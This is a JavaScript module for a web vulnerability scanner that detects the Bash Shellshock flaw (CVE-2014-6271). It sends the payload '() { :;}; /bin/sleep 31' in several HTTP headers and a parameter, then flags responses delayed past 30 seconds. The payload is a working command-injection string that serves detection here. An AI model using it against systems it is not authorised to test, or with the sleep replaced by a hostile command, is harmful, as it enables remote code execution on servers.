var module = {
  name: "Bash Environment Variable Blind OS Injection (CVE-2014-6271) Checks",
  category: "Injection Modules",
  differential: true,
  defaultDisabled: false 
};

function initialize(ctx) {
  var ps = ctx.getPathState();
    var req0 = ps.createAlteredRequest("", true);
    req0.addHeader("Custom", "() { :;}; /bin/sleep 31");
    var req1 = ps.createAlteredRequest("", true);
    req1.addHeader("User-Agent", "() { :;}; /bin/sleep 31 ");
    var req2 = ps.createAlteredRequest("", true);
    req2.addHeader("Referer", "() { :;}; /bin/sleep 31 ");
    var req3 = ps.createAlteredRequest("", true);
    req3.addHeader("Accept-Language", "() { :;}; /bin/sleep 31 ");
    var req4 = ps.createAlteredRequest("() { :;}; /bin/sleep 31", true);
    ctx.submitRequest(req0, process, 0);
    ctx.submitRequest(req1, process, 1);
    ctx.submitRequest(req2, process, 2);
    ctx.submitRequest(req3, process, 3);
    ctx.submitRequest(req4, process, 4);
}

var checkTiming = function(ctx, currentIndex) {
  if (ctx.getSavedResponse(currentIndex).milliseconds > 30000) {
    return true;
  }
  return false;
};

function process(req, res, ctx) {
  if (ctx.hasModuleFailed()) return;
  if (res.fetchFail) {
    ctx.error(req, res, "During Bash Environment Variable injection checks");
    ctx.setModuleFailed();
    return;
  }
  var ps = ctx.getPathState();
  var currentIndex = ctx.getCurrentIndex();
  ctx.addRequestResponse(req, res);
  ctx.incrementResponseCount();
  var detected = checkTiming(ctx, currentIndex);
  if (detected) {
    var uri = String(req.requestLine.uri);                                      
    var uripart = uri.replace(/\?.*/, "");                                      
    ctx.alert("vinfo-shell-inject", ctx.getSavedRequest(currentIndex), ctx.getSavedResponse(currentIndex), {
      output: res.bodyAsString,                                                 
      key: "vinfo-shell-inject:" + uripart + ":" + ps.getFuzzableParameter().name,
      resource: uripart,                                                        
      detectiontype: "Bash Environment Variable OS Injection (CVE-2014-6271) Blind Timing Analysis Checks",
      param: ps.getFuzzableParameter().name                                     
    });              
  }
}
